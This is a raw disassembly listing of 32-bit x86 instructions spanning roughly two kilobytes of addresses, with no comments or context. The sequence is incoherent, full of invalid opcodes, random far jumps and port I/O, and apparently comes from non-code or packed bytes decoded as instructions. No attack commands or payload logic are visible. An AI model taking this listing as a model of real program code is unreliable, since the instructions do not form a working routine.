  41063e:	or     DWORD PTR [edx],esp
  410640:	push   esi
  410641:	mov    ch,0x75
  410643:	and    DWORD PTR [esi+0x4c],esp
  410646:	scas   al,BYTE PTR es:[edi]
  410647:	call   0x564d:0x4725947f
  41064e:	inc    ecx
  41064f:	cmp    eax,0x281e83a4
  410654:	push   ds
  410655:	into   
  410656:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410657:	daa    
  410658:	loopne 0x4105f1
  41065a:	sub    BYTE PTR [esi],dh
  41065c:	jl     0x410624
  41065e:	and    eax,0x8f2bc2d8
  410663:	jbe    0x410680
  410665:	jge    0x4106b2
  410667:	inc    esi
  410668:	sub    DWORD PTR [esi+0x72],ebp
  41066b:	inc    edx
  41066c:	xlat   BYTE PTR ss:[ebx]
  41066e:	jno    0x4106dc
  410670:	out    0x37,al
  410672:	sub    edx,DWORD PTR [ebx-0x4a]
  410675:	mov    BYTE PTR [eax-0x52a5e7cc],bl
  41067b:	fidivr DWORD PTR [eax]
  41067d:	push   es
  41067e:	jmp    0xfa90:0x3c64eed8
  410685:	push   0xffffffaa
  410687:	add    DWORD PTR [edx+eax*8+0x1e106dbd],0x16e28984
  410692:	jl     0x410646
  410694:	adc    ah,BYTE PTR [ebp+eiz*2+0x5d961b51]
  41069b:	ss jmp 0x41069c
  41069e:	push   0x45a4be14
  4106a3:	xor    DWORD PTR [eax-0x73],edx
  4106a6:	pushf  
  4106a7:	and    DWORD PTR [esi],esp
  4106a9:	dec    ebp
  4106aa:	add    BYTE PTR [esi+0x6e],0xd0
  4106ae:	adc    DWORD PTR [ebx+0x42],eax
  4106b1:	inc    ebp
  4106b2:	cmc    
  4106b3:	sub    eax,0x255906fb
  4106b8:	dec    ecx
  4106b9:	sub    BYTE PTR [ebp+0x4d],0xfe
  4106bd:	and    dh,ah
  4106bf:	and    dh,0xb6
  4106c2:	xor    dh,BYTE PTR [esi-0x773cc9ac]
  4106c8:	cs inc esp
  4106ca:	outs   dx,BYTE PTR ds:[esi]
  4106cb:	inc    edx
  4106cc:	and    eax,DWORD PTR [eax+0x71]
  4106cf:	shl    BYTE PTR [esi-0x48],0x59
  4106d3:	test   BYTE PTR [esi+0x58],ch
  4106d6:	jecxz  0x410682
  4106d8:	retf   0x3f34
  4106db:	retf   0xf6d5
  4106de:	mov    eax,0x327c4917
  4106e3:	outs   dx,DWORD PTR ds:[esi]
  4106e4:	scas   eax,DWORD PTR es:[edi]
  4106e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106e6:	sub    al,0xc6
  4106e8:	int    0x5f
  4106ea:	jb     0x410749
  4106ec:	sbb    eax,0xb5298a1a
  4106f1:	ins    DWORD PTR es:[edi],dx
  4106f2:	clc    
  4106f3:	add    edi,DWORD PTR [ebp+0x79]
  4106f6:	retf   
  4106f7:	stc    
  4106f8:	mov    ebp,0x27bee085
  4106fd:	ffreep st(3)
  4106ff:	jns    0x410750
  410701:	xor    DWORD PTR [edi],edi
  410703:	xor    al,0x4c
  410705:	daa    
  410706:	xor    bh,BYTE PTR [esi-0x2b]
  410709:	addr16 mov eax,0xf873d48d
  41070f:	ds pop ebx
  410711:	inc    ecx
  410712:	push   ecx
  410713:	in     al,0x63
  410715:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410716:	add    bl,BYTE PTR [ebp+0x7bf5dbf6]
  41071c:	xchg   edi,eax
  41071d:	pop    eax
  41071e:	jo     0x41077d
  410720:	fisub  WORD PTR [edx]
  410722:	inc    esi
  410723:	outs   dx,DWORD PTR ds:[esi]
  410724:	cmp    BYTE PTR [esi],dl
  410726:	adc    eax,0x90471056
  41072b:	dec    esi
  41072c:	fdivrp st(0),st
  41072e:	jo     0x410758
  410730:	int3   
  410731:	jb     0x4106b8
  410733:	mov    eax,ds:0xf129e85d
  410738:	xlat   BYTE PTR ds:[ebx]
  410739:	nop
  41073a:	addr16 cmp eax,0xfb7f7aac
  410740:	pop    edx
  410741:	dec    edx
  410742:	cmp    DWORD PTR [esp+edi*2+0x3d],esi
  410746:	imul   BYTE PTR [esi+ebp*8]
  410749:	and    eax,0x740b190d
  41074e:	push   esi
  41074f:	push   ds
  410750:	popf   
  410751:	cli    
  410752:	(bad)  
  410754:	(bad)  
  410755:	scas   al,BYTE PTR es:[edi]
  410756:	rcr    DWORD PTR [ebp-0x27],1
  410759:	int    0xdd
  41075b:	and    eax,0xb805fcbd
  410760:	dec    ebp
  410761:	leave  
  410762:	sbb    ebx,DWORD PTR [edi+eax*4]
  410765:	cs cli 
  410767:	mov    cl,BYTE PTR [edx+0x4942db2]
  41076d:	or     eax,0x8669d9ca
  410772:	mov    dl,0xe8
  410774:	in     al,0xed
  410776:	aas    
  410777:	mov    DWORD PTR ds:0xaaa12937,esi
  41077d:	sub    esi,DWORD PTR [ebp-0x5]
  410780:	sub    al,BYTE PTR [esi+ebx*1-0x34bfa46f]
  410787:	push   esi
  410788:	dec    esi
  410789:	jmp    0xe102:0xd5bfb9a5
  410790:	out    0x3f,eax
  410792:	lahf   
  410793:	cli    
  410794:	and    edi,DWORD PTR [edx+0x18]
  410797:	pop    edi
  410798:	call   0x308c:0x379e93c9
  41079f:	fimul  DWORD PTR [ebx-0x51a4625]
  4107a5:	sbb    DWORD PTR [edi],esi
  4107a7:	mov    ebx,0x7931a68c
  4107ac:	das    
  4107ad:	mov    ebx,0x18a53ffb
  4107b2:	mov    ds:0x5697e506,eax
  4107b7:	mov    eax,ds:0x1150ffbe
  4107bc:	adc    esp,DWORD PTR [eax+0x37]
  4107bf:	cdq    
  4107c0:	sub    eax,0x7ea8ee3b
  4107c5:	outs   dx,DWORD PTR ds:[esi]
  4107c6:	in     eax,dx
  4107c7:	retf   
  4107c8:	mov    bl,0x98
  4107ca:	mov    ecx,0xb765c7b6
  4107cf:	ret    0xb304
  4107d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107d3:	lahf   
  4107d4:	fidivr WORD PTR [ecx+0x4a]
  4107d7:	mov    bh,0x7d
  4107d9:	lock fsub DWORD PTR [ebx+0x47]
  4107dd:	push   0x2
  4107df:	test   BYTE PTR [edi+0x6425801a],0x20
  4107e6:	dec    eax
  4107e7:	add    bl,BYTE PTR [eax+0x65d7c119]
  4107ed:	sbb    ch,dl
  4107ef:	pop    ds
  4107f0:	mov    dh,bl
  4107f2:	mov    WORD PTR [edx],?
  4107f4:	jns    0x41080c
  4107f6:	les    esi,FWORD PTR [ebx+0x78]
  4107f9:	mov    esp,0x69185c18
  4107fe:	adc    al,0xc0
  410800:	mov    ds:0xa04df82d,eax
  410805:	mov    cl,0xc3
  410807:	in     al,0xaa
  410809:	inc    edx
  41080a:	cdq    
  41080b:	mov    BYTE PTR ds:0xaddab22c,al
  410811:	sbb    al,BYTE PTR [ecx-0x5]
  410814:	shr    DWORD PTR [eax],cl
  410816:	cmp    eax,0x1f40c077
  41081b:	xchg   esi,eax
  41081c:	push   ebx
  41081d:	or     eax,0x4fa75259
  410822:	loopne 0x410819
  410824:	into   
  410825:	push   es
  410826:	mov    cl,0x3
  410828:	cmp    bl,dh
  41082a:	mov    dh,0x0
  41082c:	xchg   edi,eax
  41082d:	test   DWORD PTR ds:0x5667fd7c,edi
  410833:	adc    BYTE PTR [esi],cl
  410835:	jge    0x410865
  410837:	and    al,0xcb
  410839:	arpl   WORD PTR [esi-0x38],ax
  41083c:	adc    eax,0x1fcdb42b
  410841:	push   0x2f2aa0a5
  410846:	cmp    DWORD PTR [edi+0x21cf64f3],edi
  41084c:	into   
  41084d:	pushf  
  41084e:	mov    bl,0xb
  410850:	mov    edx,0xb2c9723d
  410855:	lods   al,BYTE PTR ds:[esi]
  410856:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410857:	or     eax,0x561f1825
  41085c:	pop    ecx
  41085d:	push   edx
  41085e:	xlat   BYTE PTR ds:[ebx]
  41085f:	jge    0x4108a6
  410861:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410862:	jg     0x41088f
  410864:	int3   
  410865:	add    DWORD PTR [edi+0x549930d1],edx
  41086b:	loop   0x410856
  41086d:	xchg   esp,eax
  41086e:	sub    DWORD PTR [ebp+0x3c85c575],edx
  410874:	dec    eax
  410875:	push   ebx
  410876:	(bad)  [esi]
  410878:	cli    
  410879:	call   0x32b2ede3
  41087e:	mov    ds:0x6115d4d0,eax
  410883:	test   al,0x35
  410885:	addr16 jge 0x410895
  410888:	jno    0x410890
  41088a:	call   0x8100:0xd6f37cd2
  410891:	push   ebp
  410892:	pop    ecx
  410893:	ror    ecx,cl
  410895:	push   edi
  410896:	cmp    DWORD PTR [eax+0x94e0e9e],esp
  41089c:	(bad)  
  41089d:	imul   ebx
  41089f:	jmp    DWORD PTR [ebx]
  4108a1:	dec    ebx
  4108a2:	xlat   BYTE PTR ds:[ebx]
  4108a3:	push   edi
  4108a4:	outs   dx,DWORD PTR ds:[esi]
  4108a5:	sub    DWORD PTR [ebx],esp
  4108a7:	jmp    0xc919b869
  4108ac:	pop    ecx
  4108ad:	mov    edx,0xc0ce4c3
  4108b2:	inc    eax
  4108b3:	repz mov ds:0x27f74c34,al
  4108b9:	out    0xdf,eax
  4108bb:	imul   eax,DWORD PTR [ecx-0x5a],0xffffffe8
  4108bf:	enter  0x4689,0x2d
  4108c3:	neg    DWORD PTR [ebp+0x3c3c5efe]
  4108c9:	mov    edx,0x192db59b
  4108ce:	sbb    eax,0xf0092b92
  4108d3:	jo     0x41093a
  4108d5:	nop
  4108d6:	sub    ah,ch
  4108d8:	and    DWORD PTR [eax-0x44f7cfad],ecx
  4108de:	test   esp,0xed87a2f6
  4108e4:	lods   al,BYTE PTR ds:[esi]
  4108e5:	sbb    DWORD PTR [esi+esi*1-0x73],ebx
  4108e9:	push   ebp
  4108ea:	mov    ah,cl
  4108ec:	sbb    ebp,DWORD PTR ds:0x8a747096
  4108f2:	out    0x44,al
  4108f4:	iret   
  4108f5:	push   eax
  4108f6:	enter  0xc394,0x23
  4108fa:	leave  
  4108fb:	sbb    BYTE PTR [edx-0x5b],dl
  4108fe:	dec    edi
  4108ff:	scas   eax,DWORD PTR es:[edi]
  410900:	push   edx
  410901:	sub    DWORD PTR [ebp+0x2d],edx
  410904:	test   al,0x76
  410906:	stos   DWORD PTR es:[edi],eax
  410907:	cmp    ecx,ebx
  410909:	mov    ebp,0xa1716a89
  41090e:	adc    edi,DWORD PTR [edx+eiz*1]
  410911:	call   0x9821fe69
  410916:	das    
  410917:	inc    eax
  410918:	cmp    eax,0xd1304d81
  41091d:	ds pop edx
  41091f:	dec    esp
  410920:	cdq    
  410921:	pop    ss
  410922:	dec    ebx
  410923:	sub    BYTE PTR [edi+0x73e233ab],al
  410929:	and    ebx,edx
  41092b:	sar    DWORD PTR [ecx],0x25
  41092e:	test   DWORD PTR [ecx+0x7a],0xff2d9790
  410935:	call   0x1b83d0d5
  41093a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41093b:	jbe    0x4109b3
  41093d:	mov    eax,ds:0x8e9cadc4
  410942:	aaa    
  410943:	(bad)  
  410944:	mov    edi,0x9c130f2d
  410949:	bound  ebx,QWORD PTR [eax+0x27ca83a6]
  41094f:	pop    ds
  410950:	mov    DWORD PTR [eax],ecx
  410952:	loope  0x4109bf
  410954:	push   cs
  410955:	jp     0x41091c
  410957:	mov    eax,0x32749ff7
  41095c:	mov    edx,0x91a82388
  410961:	xchg   edx,eax
  410962:	(bad)  
  410963:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410964:	jle    0x41097d
  410966:	sbb    ah,al
  410968:	repz mov esi,0x270ac2c1
  41096e:	loopne 0x4109d7
  410970:	int    0xfb
  410972:	dec    edx
  410973:	push   0x68
  410975:	mov    ecx,0x7030f415
  41097a:	jle    0x4109f4
  41097c:	xor    eax,0x89a7d46d
  410981:	call   0x5df57636
  410986:	repz aad 0xc0
  410989:	jmp    0xd10c:0x42d61e8e
  410990:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410991:	bnd js 0x410927
  410994:	js     0x410938
  410996:	daa    
  410997:	dec    ebx
  410998:	jg     0x41093b
  41099a:	jb     0x41098c
  41099c:	div    al
  41099e:	aas    
  41099f:	dec    edi
  4109a0:	test   BYTE PTR [ecx],0x5f
  4109a3:	sahf   
  4109a4:	mov    ebp,0xc957ea51
  4109a9:	rcr    DWORD PTR [esi-0x34],1
  4109ac:	pushf  
  4109ad:	xchg   BYTE PTR [ebx],ch
  4109af:	add    al,0x4b
  4109b1:	jmp    0x221c85
  4109b6:	jnp    0x410a09
  4109b8:	sub    ch,bh
  4109ba:	mov    ebx,0x30a7cd39
  4109bf:	push   edi
  4109c0:	loopne 0x410959
  4109c2:	(bad)  [edx-0x3]
  4109c5:	jecxz  0x41096b
  4109c7:	sbb    cl,BYTE PTR [ebx]
  4109c9:	cwde   
  4109ca:	sub    cl,BYTE PTR [edi]
  4109cc:	push   cs
  4109cd:	pushf  
  4109ce:	xchg   edx,eax
  4109cf:	in     al,dx
  4109d0:	shl    DWORD PTR [esi],cl
  4109d2:	adc    DWORD PTR [edi+0x34618fd1],ebx
  4109d8:	in     eax,dx
  4109d9:	je     0x4109ee
  4109db:	pop    esi
  4109dc:	xchg   edi,eax
  4109dd:	arpl   dx,ax
  4109df:	test   DWORD PTR [edx],ecx
  4109e1:	jae    0x4109a6
  4109e3:	in     eax,0x5e
  4109e5:	loopne 0x410a11
  4109e7:	sar    DWORD PTR [edx+eax*8+0x509ebc56],cl
  4109ee:	scas   eax,DWORD PTR es:[edi]
  4109ef:	push   es
  4109f0:	test   DWORD PTR [eax+0x3b],edi
  4109f3:	stc    
  4109f4:	inc    ebx
  4109f5:	retf   
  4109f6:	lods   al,BYTE PTR ds:[esi]
  4109f7:	aaa    
  4109f8:	(bad)  
  4109f9:	or     DWORD PTR [ecx+0x5c8855ab],ebp
  4109ff:	cmp    al,0x31
  410a01:	imul   eax,DWORD PTR [ebp-0x47],0x19
  410a05:	cmp    eax,0xd237b176
  410a0a:	fs xchg esp,eax
  410a0c:	and    al,0xa0
  410a0e:	mov    BYTE PTR [ebx+edx*2+0x14ae2863],ah
  410a15:	dec    eax
  410a16:	bound  edi,QWORD PTR ds:0xffa5ea68
  410a1c:	test   BYTE PTR [edx-0x4590ad16],ch
  410a22:	call   0x50ae:0xfeb810f1
  410a29:	sub    ah,cl
  410a2b:	test   DWORD PTR [eax],eax
  410a2d:	out    0xa7,al
  410a2f:	push   edx
  410a30:	fs sbb al,0xd9
  410a33:	jae    0x4109c6
  410a35:	ds loope 0x410a9e
  410a38:	cmp    BYTE PTR [ebp+0x6ebb6e70],dl
  410a3e:	pop    ebx
  410a3f:	fwait
  410a40:	int    0x86
  410a42:	cdq    
  410a43:	mov    WORD PTR [esi-0x1d],ds
  410a46:	add    DWORD PTR [ecx-0x63946832],ecx
  410a4c:	aas    
  410a4d:	jne    0x4109e1
  410a4f:	push   0x554f382c
  410a54:	mov    edi,DWORD PTR [eax-0x23]
  410a57:	fnstcw WORD PTR [edi-0xc]
  410a5a:	lock pop esi
  410a5c:	jmp    0xe978:0xd611452
  410a63:	setb   al
  410a66:	jno    0x410a8d
  410a68:	xchg   ecx,eax
  410a69:	ss or  bh,0x6a
  410a6d:	and    eax,0x93d4363a
  410a72:	xchg   BYTE PTR [ecx],bh
  410a74:	leave  
  410a75:	ror    BYTE PTR [ebp+0x3971fc9c],cl
  410a7b:	popf   
  410a7c:	add    BYTE PTR [edi],bh
  410a7e:	jp     0x410a16
  410a80:	mov    ah,0xe9
  410a82:	or     BYTE PTR ds:0x245a58c4,0xbb
  410a89:	int    0xac
  410a8b:	ja     0x410ad9
  410a8d:	adc    eax,0xf7c9486e
  410a92:	cmp    esi,edx
  410a94:	or     ebp,esp
  410a96:	(bad)  
  410a98:	out    0x90,al
  410a9a:	xor    ebp,ebp
  410a9c:	cs mov ebp,0xb267dda6
  410aa2:	sti    
  410aa3:	dec    ecx
  410aa4:	cli    
  410aa5:	popf   
  410aa6:	mov    cl,BYTE PTR [ebx+edx*2]
  410aa9:	scas   al,BYTE PTR es:[edi]
  410aaa:	pop    ds
  410aab:	mov    cl,0x89
  410aad:	dec    edx
  410aae:	int    0x9
  410ab0:	xor    bl,dh
  410ab2:	add    DWORD PTR ds:0xd55ccc86,eax
  410ab8:	sub    BYTE PTR [esi],ch
  410aba:	mov    al,0x97
  410abc:	int    0x52
  410abe:	test   DWORD PTR [ebx-0x14b28a31],ebp
  410ac4:	jg     0x410acd
  410ac6:	adc    esp,DWORD PTR [esi]
  410ac8:	pop    es
  410ac9:	ror    DWORD PTR [ecx+ecx*4],0xfc
  410acd:	popa   
  410ace:	mov    ebx,0xc8a975e8
  410ad3:	btc    DWORD PTR [edx],esi
  410ad6:	jmp    FWORD PTR [eax+0x3c]
  410ad9:	loopne 0x410aea
  410adb:	dec    esp
  410adc:	lock push edi
  410ade:	daa    
  410adf:	and    eax,0xf790af5e
  410ae5:	dec    edi
  410ae6:	shr    BYTE PTR [ebx+0x5],0x49
  410aea:	test   BYTE PTR [ebx],cl
  410aec:	rcl    BYTE PTR [ebx-0x2f],0xc6
  410af0:	mov    ds:0x519efb39,al
  410af5:	push   ecx
  410af6:	dec    eax
  410af7:	retf   0x3935
  410afa:	out    0xf2,eax
  410afc:	in     al,dx
  410afd:	jnp    0x410b57
  410aff:	in     al,0x2e
  410b01:	inc    eax
  410b02:	clc    
  410b03:	jmp    0x410b74
  410b05:	dec    edi
  410b06:	pop    edx
  410b07:	mov    esp,0x9adca157
  410b0c:	fimul  WORD PTR [eax-0x3c]
  410b0f:	jge    0x410af5
  410b11:	inc    ecx
  410b12:	jbe    0x410b0f
  410b14:	mov    WORD PTR [ecx-0x7e],?
  410b17:	dec    esi
  410b18:	pop    edi
  410b19:	dec    esi
  410b1a:	push   0x7e
  410b1c:	dec    esp
  410b1d:	jb     0x410aac
  410b1f:	mov    ah,0xf3
  410b21:	pop    edi
  410b22:	add    al,0x1d
  410b24:	dec    ecx
  410b25:	inc    esp
  410b26:	push   ecx
  410b27:	dec    ebx
  410b28:	ret    0x81fc
  410b2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b2c:	xor    ebx,DWORD PTR [eax]
  410b2e:	imul   esi,DWORD PTR [ebx+0xf],0xffffffe5
  410b32:	fcomp  QWORD PTR [ebp+0x3f]
  410b35:	test   DWORD PTR [edx-0x40aec20d],eax
  410b3b:	loop   0x410b89
  410b3d:	push   ds
  410b3e:	pop    ecx
  410b3f:	(bad)  
  410b40:	xor    DWORD PTR gs:0x3db13d7f,edi
  410b47:	pop    edx
  410b48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b49:	pop    ebx
  410b4a:	adc    ch,BYTE PTR [esp+ecx*8]
  410b4d:	test   eax,0x4c67004e
  410b52:	in     eax,0x18
  410b54:	adc    eax,DWORD PTR [edi+0x45]
  410b57:	xor    eax,0xe1078c8b
  410b5c:	mov    DWORD PTR [ebx+0x4],edx
  410b5f:	stos   DWORD PTR es:[edi],eax
  410b60:	iret   
  410b61:	retf   
  410b62:	fstp   st(7)
  410b64:	lahf   
  410b65:	and    bh,BYTE PTR [ebp-0x7b47799a]
  410b6b:	inc    esi
  410b6c:	in     eax,0xf8
  410b6e:	push   ss
  410b6f:	cmc    
  410b70:	jns    0x410b73
  410b72:	mov    eax,0xc80d14b0
  410b77:	les    ecx,FWORD PTR [ebp+esi*1+0x70]
  410b7b:	push   ds
  410b7c:	or     ecx,DWORD PTR ds:[edx-0x49feb469]
  410b83:	sub    al,0xd6
  410b85:	out    0x98,eax
  410b87:	jnp    0x410b33
  410b89:	mov    edi,0x9507ab3e
  410b8e:	sbb    al,0x2f
  410b90:	xchg   ebp,eax
  410b91:	sbb    edx,DWORD PTR [eax+0x20]
  410b94:	push   esp
  410b95:	rol    DWORD PTR [ecx],cl
  410b97:	or     BYTE PTR [esi],0xa4
  410b9a:	aas    
  410b9b:	dec    ecx
  410b9c:	mov    ebx,0xae8df227
  410ba1:	scas   eax,DWORD PTR es:[edi]
  410ba2:	sbb    BYTE PTR [ebp-0x1f],0x5f
  410ba6:	aad    0x3
  410ba8:	pop    eax
  410ba9:	outs   dx,BYTE PTR ds:[esi]
  410baa:	lods   al,BYTE PTR ds:[esi]
  410bab:	pop    ebx
  410bac:	fwait
  410bad:	ds push ss
  410baf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bb0:	(bad)  
  410bb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bb2:	into   
  410bb3:	loopne 0x410bd8
  410bb5:	shl    BYTE PTR [ebp+0x4a5b576f],0x6c
  410bbc:	pop    ss
  410bbd:	cmp    BYTE PTR [esi+0x60],al
  410bc0:	nop
  410bc1:	adc    eax,0xdb6f7ace
  410bc6:	popa   
  410bc7:	mov    ecx,0xeabd5a56
  410bcc:	cmp    BYTE PTR [ebx],0x26
  410bcf:	push   edx
  410bd0:	es dec ecx
  410bd2:	js     0x410bbd
  410bd4:	popf   
  410bd5:	je     0x410ba6
  410bd7:	jo     0x410b65
  410bd9:	repnz icebp 
  410bdb:	jmp    0x9b5d:0x5a9d5d22
  410be2:	lahf   
  410be3:	xor    eax,0x79541a17
  410be8:	or     esp,ebp
  410bea:	loop   0x410ba7
  410bec:	add    ch,BYTE PTR [esp+eiz*4]
  410bef:	repnz inc esi
  410bf1:	and    eax,0x4d873820
  410bf6:	out    dx,al
  410bf7:	mov    ?,esi
  410bf9:	push   es
  410bfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410bfb:	pop    ebp
  410bfc:	ret    0x6361
  410bff:	repnz rcr bh,cl
  410c02:	aad    0x36
  410c04:	fcmovnbe st,st(5)
  410c06:	adc    BYTE PTR [edi-0x3bd45894],0xad
  410c0d:	and    dl,BYTE PTR ds:0xc13e55b6
  410c13:	xor    edx,ecx
  410c15:	popa   
  410c16:	add    eax,0x47722217
  410c1b:	pop    ss
  410c1c:	scas   al,BYTE PTR es:[edi]
  410c1d:	mov    eax,edi
  410c1f:	pop    ebp
  410c20:	sub    eax,0x5c92b213
  410c25:	lds    edi,FWORD PTR [ecx-0x3fe7913f]
  410c2b:	cld    
  410c2c:	mov    ah,0x9e
  410c2e:	sbb    esp,esi
  410c30:	cmp    ah,BYTE PTR [edx-0x226e152d]
  410c36:	jbe    0x410c66
  410c38:	hlt    
  410c39:	rcr    dh,1
  410c3b:	int3   
  410c3c:	data16 jbe 0x410c26
  410c3f:	push   0xd9e50325
  410c44:	(bad)  
  410c45:	jmp    0xe9390857
  410c4a:	pusha  
  410c4b:	add    BYTE PTR [ebx-0x6ac9ce1c],0x5c
  410c52:	aas    
  410c53:	es out dx,al
  410c55:	push   eax
  410c56:	add    eax,0x6f84b5ba
  410c5b:	xor    ecx,DWORD PTR [edx-0x64df8fbd]
  410c61:	addr16 jmp 0xe5353a7f
  410c67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c68:	retf   
  410c69:	(bad)  
  410c6b:	mov    eax,0xf65c4071
  410c70:	stos   BYTE PTR es:[edi],al
  410c71:	pop    es
  410c72:	cmp    bl,BYTE PTR [eax+eiz*8-0x5a26f490]
  410c79:	mov    edx,0xf8ec4565
  410c7e:	fiadd  DWORD PTR [ecx]
  410c80:	repz pop ebx
  410c82:	adc    dh,BYTE PTR [edx+0x30]
  410c85:	mov    esp,0xa4dcabdd
  410c8a:	mov    ebx,DWORD PTR [ebx+0x4787b3b6]
  410c90:	mov    ds:0x9f06b930,al
  410c95:	cmp    DWORD PTR [eax+0x68],esp
  410c98:	or     al,0x76
  410c9a:	ss out 0xe2,al
  410c9d:	mov    ds:0xdfb6a161,eax
  410ca2:	xchg   esi,eax
  410ca3:	adc    BYTE PTR [eax],ch
  410ca5:	push   cs
  410ca6:	sub    edx,DWORD PTR [eax+0x40]
  410ca9:	pop    ecx
  410caa:	mov    ah,BYTE PTR [edi-0xad132c5]
  410cb0:	jne    0x410cd9
  410cb2:	jbe    0x410cef
  410cb4:	hlt    
  410cb5:	sahf   
  410cb6:	sub    BYTE PTR [ebx-0x5e],ah
  410cb9:	(bad)  
  410cba:	jae    0x410cef
  410cbc:	call   0xe4c7:0xdcb3972b
  410cc3:	call   0xcd26f19b
  410cc8:	in     eax,0x13
  410cca:	adc    esp,eax
  410ccc:	sbb    al,0xd
  410cce:	xor    eax,0xef1b1fc2
  410cd3:	out    0x99,al
  410cd5:	adc    ch,BYTE PTR [ebp+0x13]
  410cd8:	les    esp,FWORD PTR [edi+0x1da049e]
  410cde:	push   ds
  410cdf:	pop    es
  410ce0:	repnz or eax,0x3815ebcb
  410ce6:	in     al,0x54
  410ce8:	fs sub eax,0x13741a7c
  410cee:	test   BYTE PTR [ebx-0x77],0x82
  410cf2:	pop    ebp
  410cf3:	js     0x410cf0
  410cf5:	mov    ds:0xd9f2f7dd,eax
  410cfa:	sub    al,0x75
  410cfc:	pop    es
  410cfd:	rcl    BYTE PTR [ebx-0x2aeab7c3],1
  410d03:	in     eax,dx
  410d04:	dec    ebp
  410d05:	popf   
  410d06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d07:	xchg   edi,eax
  410d08:	jp     0x410d56
  410d0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d0b:	out    dx,eax
  410d0c:	fimul  DWORD PTR [eax-0x35]
  410d0f:	pop    edx
  410d10:	mov    ds:0x810e4ee2,eax
  410d15:	mov    ecx,0xa61c4cb8
  410d1a:	mov    ds:0xf43fef96,al
  410d1f:	and    cl,BYTE PTR [esi+0x1]
  410d22:	test   al,0x65
  410d24:	inc    eax
  410d25:	pop    ebp
  410d26:	and    ecx,DWORD PTR [ebx-0x4e0fa143]
  410d2c:	jmp    0x539b9fb7
  410d31:	sub    ecx,DWORD PTR [ebx-0x7e68ed8a]
  410d37:	loopne 0x410d8f
  410d39:	in     eax,0xdf
  410d3b:	in     al,0x6a
  410d3d:	rol    esi,1
  410d3f:	pop    eax
  410d40:	push   ds
  410d41:	loope  0x410d55
  410d43:	iret   
  410d44:	sbb    bl,BYTE PTR [esi]
  410d46:	or     al,0xfe
  410d48:	pop    esp
  410d49:	out    0x2,al
  410d4b:	mov    esi,0xf07c81f1
  410d50:	xchg   DWORD PTR [eax+0x3319a3df],ecx
  410d56:	push   edi
  410d57:	bound  esp,QWORD PTR [ebx+ebx*2+0x2a]
  410d5b:	jb     0x410d73
  410d5d:	sub    DWORD PTR [esp+edi*1+0x6c],esi
  410d61:	cmp    bh,BYTE PTR [edi-0x2958ee0f]
  410d67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d68:	lods   eax,DWORD PTR ds:[esi]
  410d69:	add    bh,al
  410d6b:	push   esp
  410d6c:	imul   ecx,DWORD PTR [esi],0x57
  410d6f:	scas   al,BYTE PTR es:[edi]
  410d70:	inc    eax
  410d71:	mov    ah,0x99
  410d73:	mov    dh,0x2c
  410d75:	in     al,dx
  410d76:	je     0x410d34
  410d78:	push   edx
  410d79:	(bad)  
  410d7a:	jo     0x410d5d
  410d7c:	pop    eax
  410d7d:	loopne 0x410d7c
  410d7f:	jecxz  0x410d6a
  410d81:	mov    edi,0x3d167a7a
  410d86:	sar    DWORD PTR [eax-0x21],0x19
  410d8a:	mov    esp,0x2c5f3d9c
  410d8f:	icebp  
  410d90:	(bad)  
  410d91:	clc    
  410d92:	dec    ecx
  410d93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d94:	popa   
  410d95:	jne    0x410df4
  410d97:	ret    0xfcfe
  410d9a:	aaa    
  410d9b:	sub    DWORD PTR [edi-0x5131d81c],ecx
  410da1:	pop    edx
  410da2:	adc    BYTE PTR [edi+0x6a],ah
  410da5:	xor    DWORD PTR [esi-0x396fd519],ebx
  410dab:	xor    BYTE PTR [eax-0x5a],dl
  410dae:	xor    eax,0x2a3a2e7e
  410db3:	call   0x3ee84155
  410db8:	inc    esi
  410db9:	jmp    0x81d2:0xdddb2aa5
  410dc0:	pop    esi
  410dc1:	push   ebx
  410dc2:	sub    BYTE PTR [ecx+0x54],dl
  410dc5:	and    BYTE PTR [esi+0x6524a174],dl
  410dcb:	test   BYTE PTR [ecx+0x2d74bd5b],cl
  410dd1:	jns    0x410e41
  410dd3:	sub    esp,DWORD PTR [ebx+0x65]
  410dd6:	fistp  WORD PTR [ebx*1+0x7c1fd1a]
  410ddd:	xor    ch,dl
  410ddf:	adc    ecx,ebx
  410de1:	dec    ebx
  410de2:	popf   
  410de3:	dec    eax
  410de4:	mov    bh,0xfd
  410de6:	inc    ebp
  410de7:	fnstenv [ebp+0xbc014b9]
  410ded:	inc    ebx
  410dee:	hlt    
  410def:	jmp    0x3f00e566
  410df4:	mov    dl,0x3d
  410df6:	xor    edx,0x1b2a8f4b
  410dfc:	xchg   BYTE PTR [edx+ebp*1+0x3c],ah
  410e00:	dec    ecx
  410e01:	mov    eax,ds:0xc096c2c6
  410e06:	fcomp  DWORD PTR [esi]
  410e08:	sbb    esp,DWORD PTR [ecx+0x45]
  410e0b:	aad    0x73
  410e0d:	pop    es
  410e0e:	test   al,0x2d
  410e10:	in     al,dx
  410e11:	test   eax,esp
  410e13:	pop    ebx
  410e14:	add    esp,DWORD PTR [ebp+0x5]
  410e17:	xor    eax,0x3c79422
  410e1c:	dec    esp
  410e1d:	jecxz  0x410e23
  410e1f:	scas   eax,DWORD PTR es:[edi]
  410e20:	mov    bl,BYTE PTR [ebp+0x1b]
  410e23:	imul   edx,DWORD PTR [eax+0x78c379ce],0x70ecffa
  410e2d:	pop    eax
  410e2e:	fwait
  410e2f:	pusha  
